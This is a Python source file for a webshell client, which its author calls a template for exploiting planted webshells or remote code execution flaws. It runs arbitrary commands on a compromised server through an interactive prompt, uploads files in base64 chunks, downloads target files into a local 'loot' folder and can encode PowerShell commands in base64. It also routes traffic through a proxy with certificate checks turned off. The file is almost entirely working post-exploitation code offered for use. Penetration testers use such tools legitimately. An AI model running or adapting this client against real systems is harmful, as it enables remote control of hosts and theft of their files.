#!/usr/bin/python3
"""
Webshell-client 
By Gael Favraud OS-65554

A very simple webshell client to make use of webshell or RCE more confortable.
It's more like a template than a real finished tool.

Provides a convenient prompt with history and completion from history.

Displays the ouput from the system() call.
If things worked well it is between the startSeq and endSeq strings in the 
HTML response.
If these strings are not found in the response then the whole raw HTML
is printed.

If you're using Kali you might have to install/update some python packages
"""

import requests
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
import datetime
import os
import base64
import re 
from pprint import pprint



# Parameters ===================================================================
# Update these to fit your needs

historyFile = './webshell_history'
sslVerify = False
conf = {
    'os' : "none",
    'uploadChunkSize' : 512,
    'downloadChunkSize' : 512,
    'lootDir' : "loot" }

# URL of the webshell and GET params (for all cmd executions)
url = 'https://127.0.0.1:9443/webshell.php?param1=value1'
#getParams = {'param2' : 'value2'}
getParams = {}

# Cookies 
# Can copie paste Cookie header from a request
#cookies = 'Cookie: SESSID=12345;'
#cookies = {'SESSID':'12345', 'a':'b'}
cookies = {}

# Proxy
#proxy = None 
proxy = {'http':'http://localhost:8080',
    'https':'http://localhost:8080'} # Burp

# Delimiters for the system() output or None for raw output
#startSeq = '<pre>'
#endSeq = '</pre>'
startSeq = None 
endSeq = None


def execCmd(cmd):
    """Execute unitary command in webshell and extract response

    EDIT HERE THE CODE TO SEND CMD TO WEBSHELL OR TO RCE"""
    
    print("\033[38;2;170;34;255m", end="")
    print('    Time:', datetime.datetime.now()) 
    
    # To get the formatted URL before sending the request
    # (good for debugging and reporting)
    
    # Code for GET request
    getParams['cmd'] = cmd
    req = requests.Request('GET',  url, params=getParams)
    prepReq = s.prepare_request(req)
    print("     GET: %s\n" % prepReq.url)
    
    print("DEBUG : EXECCMD ", cmd)

    # # Code for POST request
    # data['cmd'] = cmd
    # req = requests.Request('POST',  url, params=getParams, data=data)
    # prepReq = s.prepare_request(req)
    # print("     POST: %s\n     Data: %s\n" % (prepReq.url, repr(data))

    print('\x1b[0m', end='')

    # Send request
    r  = s.send(prepReq)

    # -------- 
    # Post processing
    # Extract command result from response
    # If exploiting an RCE, there might dummy text in the request before/after 
    # the command result, this extracts the command result between startSeq and
    # endSeq. Set to None if not necessary.

    if startSeq is None:
        posStart = 0
    else:
        posStart = r.text.find(startSeq)
        if posStart == -1:
            posStart = 0
        else:
            posStart += len(startSeq)
    if endSeq is None:
        posEnd = len(r.text)
    else:
        posEnd = r.text.find(endSeq)
        if posEnd == -1:
            posEnd = len(r.text)

    return r.text[posStart:posEnd]



# Inits ========================================================================

# Setup prompt
promptSession = PromptSession(
    history=FileHistory( historyFile))
style = Style.from_dict({
    # User input (default text).
    '': '#ff0066',
    # Prompt.
    'prompt': '#aa22ff',
})

promptMessage = [('class:prompt', 'webshell> ')]

# Setup requests session
s = requests.Session()

# To avoid verify SSL certificates (insecure)
if not sslVerify:
    # Disable warnings
    requests.packages.urllib3.disable_warnings()
    s.verify  = False

# Parse and setup cookies
# If it's a string turns it into a dictionary
if type(cookies) is str:
    if cookies.startswith('Cookie: '):
        cookies = cookies[8:]
    r = {}
    # TODO : ; at the end, and if = in value
    for c in cookies.split(','):
        c = c.split('=')
        r[c[0].strip()] = c[1].strip()
    cookies = r
if cookies is not None and len(cookies) > 0:
    s.cookies.update(cookies)

# Setup proxies
if proxy is not None:
    s.proxies.update(proxy)


# # Authentication ===============================================================
# # If auth or other pre operations are needed, do it here
#
# print("[*] Retrieve login page")
# s.get('http://10.1.2.3/login.php')
# 
# print("[*] Sending credentials")
# s.post('http://10.1.2.3/login.php', data = 
#     {'Username':'admin', 'Password':'admin', 'Submit':'Login'})
#
# # Or set cookies (NOT TESTED)
# s.cookies.set("COOKIE_NAME", "value", domain="example.com")


    
# ===============================================
# Helpers 

def parseArgString(s):
    """ Parse arguments from command prompt
    """
    escapeSeqs = {'n':'\n','t':'\t','r':'\r'}
    passThroughSeqs =' "\\\''
    def unescape(s):
        print("Unescaping '%s'" % s)
        if s[0] in escapeSeqs:
            return escapeSeqs[s[0]]+s[1:]
        elif s[0] in passThroughSeqs:
            return s
        elif re.match('x[0-9a-fA-F]{2}', s):
            return chr(int(s[1:3],16)) + s[3:]
        else:
            print("Warning: invalid escape sequence \\%s" % s[:3])
            return s        
    tokens = re.split('([\\\\"\' ])', s)
    res = []
    inSingleQuote = False
    inDoubleQuote = False
    inEscapeSeq = False
    inBetweenArgs = True
    curStr = ""
    for t in tokens:
        if t=="": continue
        if inBetweenArgs:
            if t == ' ':
                continue
            else:
                inBetweenArgs = False
        if inEscapeSeq:
            curStr += unescape(t)
            inEscapeSeq = False
        elif inSingleQuote:
            if t == "'":
                inSingleQuote = False
            else:
                curStr += t
        elif t == '\\':
            inEscapeSeq = True
        elif inDoubleQuote:
            if t == '"':
                inDoubleQuote = False
            else:
                curStr += t
        elif t == "'":
            inSingleQuote = True
        elif t == '"':
            inDoubleQuote = True
        elif t == ' ':
            res.append( curStr )
            curStr = ""
            inBetweenArgs = True
        else:
            curStr += t
    if not inBetweenArgs:
        res.append( curStr )
    if inSingleQuote or inDoubleQuote:
        print("[#] Warning: Unclosed quoted expression in arguments. Assumed closing auote at the end of expression.")
    return res        


def powershellB64( cmd ):
    return "powershell -E " + base64.b64encode(cmd.encode('utf-16le')).decode()


def checkAndCreateLootDir():
    lootDir = conf['lootDir']
    if not os.path.isdir(lootDir):
        if os.path.exists(lootDir):
            print("[!] Cannot create loot dir \"%s\": gike with same name already exists.")
            return False
        print("[i] Creating lootdir %s." % os.path.realpath(lootDir))
        os.mkdir(lootDir)
    return True
       
            
def generateLootFilename(f):
    checkAndCreateLootDir()
    lootDir = conf['lootDir']
    # Sanitize filename (avoid self pawn)
    f = re.sub("[^a-zA-Z0-9+=_.-]+", "-", f)
    basename = re.split('/\\\\', f)[-1]
    basename, ext = os.path.splitext(basename)
    filename = "%s%s" % (basename, ext)
    i = 0
    while os.path.exists(os.path.join(lootDir, filename)):
        i += 1
        filename = "%s-%03d%s" % ( basename, i, ext)
    return os.path.join(lootDir, filename)
        


def setConf(conf, fld, val):
    """Validate and set configuration parameters"""

    if fld == 'os':
        if val not in ["linux", "windows"]:
            print("[!] ERROR: Invalid value %s for  'os' parameter. Must be 'linux' or 'windows'.")
            return
    elif fld in ("uploadChunkSize", "downloadChunkSize"):
        try:
            val = int(val.strip())
        except ValueError:
            print("[!] ERROR: %s must be a positive integer (\"%s\" given)." % (fld, val))
            return
        if val <= 0:
            print("[!] ERROR: %s must be a positive value (%d given)." % (fld, val))
            return
        if val >= 1500 and fld == "uploadChunkSize":
            print("[W] Warning: Big uploadChunkSize may result in long URL, which maY not work on some servers.")
    elif fld in conf:
        # Non validated parameter
        pass
    else:
        print("[!] ERROR: Invalid parameter name %s" % fld)
        return

    conf[fld] = val
    print("[i] Configuration: %s set to \"%s\"" % (fld, str(val)))

        
    
def uploadFile(localPath, dstPath=None, chunkSize=None):
    """Poor's man method to upload files with commands such as echo and base64
    
    Usefull if firewall blocking all other connections"""    
    
    print("[*] Uploading file \"%s\" to \"%s\"" %(localPath, dstPath))
    
    try:
        with open(localPath,'rb') as f:
            fileContent  = f.read()
        fileSize = len(fileContent)
    except:
        print("[!] Cannot read local file %s." % localPath)
        return
        
    if dstPath is None:
        dstPath = re.split(r'[/\\]', localPath)[-1]
    if chunkSize is not None:
        chunkSize = int(chunkSize)
    else:
        chunkSize = conf['uploadChunkSize']
    if chunkSize <= 0:
        print("[!] Invalid chunkSize %d" % chunkSize)
        return
   
    for pos in range(0, fileSize, chunkSize):
        print("[*] Sending bytes %d to %d out of %d" % (pos, pos+chunkSize-1, fileSize))
        chunk = fileContent[pos:pos+chunkSize]
        if conf['os'] == "linux":
            cmd = "echo %s|base64 -d%s'%s'" % (
                base64.b64encode(chunk).decode(),
                '>' if pos == 0 else '>>',
                dstPath
                )
        elif conf['os'] == "windows":
            cmd = "%s-Content '%s' ([byte[]] @(%s)) -Encoding Byte" \
                % ("Set" if pos==0 else "Add", dstPath, ",".join("%d" % _ for _ in chunk) )
            cmd = "powershell -C \"%s\" 2>&1" % cmd
        else:
            print("[!] Not implemented for OS \"%s\"" % conf['os'])
            return
        execCmd(cmd) 





def downloadFile( dstPath, localPath=None, chunkSize = None):
    
    # Inits
    
    if localPath is None:
        lootFile = generateLootFilename(dstPath)
        print("[i] Saving to %s." % lootFile)
    else:
        lootFile = localPath
       
    if chunkSize is not None:
        chunkSize = int(chunkSize)
    else:
        chunkSize = conf['downloadChunkSize']
    if chunkSize <= 0:
        print("[!] Invalid chunkSize %d" % chunkSize)
        return
    
    # Retrieve file size
    
    print("[*] Retrieving file size")
    if conf['os'] == "linux":
        cmd = "printf Xx;wc -c '%s'|cut -d' ' -f1|tr -d '\\n';printf xX" % dstPath
    elif conf['os'] == "windows":
        cmd = "'Xx'+(Get-Item '%s').Length+'xX'" % dstPath
        cmd = "powershell -c \"%s\"" % cmd
        #cmd = powershellB64( cmd )
    else:
        print("[!] Not implemented for OS \"%s\"" % conf['os'])
        return
    res = execCmd(cmd)
    if not (m := re.search('Xx([0-9]+)xX', res)):
        print("[!] Could not retrieve file size")
        return b""
    fileSize = int( m.group(1) )
    
    # Retrieve file,  chunk by chunk
    
    fileContent = b""
    with open(lootFile, 'wb') as f:
        try:
            for pos in range(0, fileSize, chunkSize):
                thisChunkSize = min(fileSize-pos, chunkSize)
                print("[*] Retrieving bytes %d to %d out of %d" % (pos, pos+thisChunkSize-1, fileSize))
                if conf['os'] == "linux":
                    # TODO : Switch to tail|head when half of file reached
                    cmd = "head -c %d \"%s\"|tail -c %d|base64" \
                        % (pos + chunkSize, dstPath, thisChunkSize)

                elif conf['os'] == "windows":
                    cmd = "[Convert]::ToBase64String((gc '%s' -Encoding byte|select -skip %d -first %d))" \
                        % (dstPath, pos, chunkSize)
                    cmd = "powershell -c \"%s\"" % cmd
                    #cmd = powershellB64( cmd )
                    
                res = execCmd( cmd )
                chunkBytes = base64.b64decode(res)
                print(len(fileContent), len(chunkBytes))
                fileContent += chunkBytes
                f.write(chunkBytes)
        except KeyboardInterrupt:
            print("[!] Aborted by user.")
            print("[i] Partial download saved to %s." % lootFile)
        except Exception as err:
            print("[!] An error occured.\n", err)
            print("[i] Partial download saved to %s." % lootFile)
    return fileContent
            
        
# ==============================================
# UI functions

def uicmdConf(*args):
    if len(args) == 0 \
            or (len(args) == 1 and args[0] == "show"):
        print("[i] Current configuration")
        for k in conf:
            print("    %s: " % k, conf[k])
        return
        
    if args[0] == "set":
        if len(args) != 3:
            print("[!] Error: conf set requires 2 arguments, %d provided." % (len(args)-1))
            return
        k, v = args[1:]

        setConf(conf, k, v)
        return
        
    else:
        print("[!] Error: Invalid sub command %s for conf" % args[0])
        return
        
def uicmdPrintHelp():
    print("Internal commands:")
    print("  %exit")
    print("  %conf set key value")
    print("  %conf [show]")
    print("  %put localfile [ distfile [ chunkSize ]]") 
    print("  %get distFile [ localFile [ chunkSize ]]")
    print("Warning:\n  For all internal commands, arguments are parsed and so \\ must be escaped.")
    print("  Arguments may contain escape sequences, and be single or double quoted to include spaces.")
    
    print()
    
        
# Main loop ====================================================================




while True:
    uiCmd = promptSession.prompt(promptMessage, 
        auto_suggest = AutoSuggestFromHistory(),
        style = style )
        
    if uiCmd == '%exit':
        break
        
    elif uiCmd.startswith("%"):
        args = parseArgString(uiCmd[1:])
        
        if args[0] == "help":
            uicmdPrintHelp()
        elif args[0] == "dbgParseArgs": 
            #DEBUG : Check how args are parsed
            print( "\n".join("arg%d: %s (\"\"\"%s\"\"\")" % (i,repr(args[i]), args[i])
                for i in range(len(args))))
        elif args[0] == "conf":
            uicmdConf(*args[1:])
        elif args[0] in ("put", "u", "upload"):
            uploadFile(*args[1:])
        elif args[0] in ("get", "d", "download"):
            res = downloadFile(*args[1:])
            #print(res.decode('latin1 '))
        elif args[0].startswith("%"):
            print( execCmd(uiCmd[1:]) )
        else:
            print("[!] Invalid internal command %%%s" % args[0])
            
    else:
        res = execCmd(uiCmd)
        print(res)

    
